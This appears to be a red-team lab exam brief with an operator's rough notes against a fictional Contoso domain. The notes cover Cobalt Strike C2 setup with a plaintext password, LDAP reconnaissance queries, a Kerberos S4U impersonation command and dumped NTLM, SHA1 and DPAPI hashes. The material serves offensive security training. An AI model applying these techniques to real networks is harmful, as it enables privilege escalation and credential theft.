Your objective is to simulate an advanced threat and gain access to a secure storage server - enc-fs-1.contoso.enclave. You must prove access by writing a text file to its hard disk at the location C:\rto.txt. The content does not matter.

# Rules of Engagement

## Authorised Target Spaces

You are authorised to attack the following domains and IPs:

- 10.10.122.0/23 (dublin.contoso.com)
- 10.10.120.0/24 (contoso.com)
- 10.10.124.0/24 (contoso.enclave)

## Restricted Hosts

You are not authorised to attack the following domains and IPs:

- 10.10.x.254
- 10.10.124.1 (enc-dc-1.contoso.enclave)
- 10.10.124.200 (elk.contoso.enclave)

# Operator Notes:

To modify your C2 profile:

1. ssh attacker@10.0.0.5 and login with Passw0rd!.
2. cd /opt/cobaltstrike/profiles
3. Change _default.profile_ as needed.
4. Run sudo /usr/bin/docker restart cobalt to restart the Docker container.
5. If the container fails to start, run sudo /usr/bin/docker logs cobalt to see the errors.

---

## Set the beacon size
```
set tasks_max_size "2097152";
```
# note
is admin:
```
 Niall Wallace
```
id dub domain

BRO I GUESS I SHOULD HAVE IMPERSONATE THIS USER, NOT THE ADMIN?!
i should have run this:
```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

Finding db instance:
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

LINK THE DB VIA A LOW LEVEL USER!

SQL from dub-web-1
```
krb_s4u /ticket:doIF4jNPTQ== /service:MSSQLSvc/dub-sql-1.dublin.contoso.com /altservice:cifs /impersonateuser:Administrator
```

uff:
```

Action: List Kerberos Tickets (All Users)


--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x6162a6  | Administrator @ DUBLIN.CONTOSO.COM       | cifs/dub-sql-1.dublin.contoso.com 
```

tdobson hash:
```
 [00000003] Primary
	 * Username : tdobson
	 * Domain   : DUBLIN
	 * NTLM     : 4a0f9bc164edc4aab545196cce6d7c9d
	 * SHA1     : 27e227423cad68e99a36abecabf1a7acebd7fa91
	 * DPAPI    : 5680fc1051d04d4055279e2b729e9be9
```
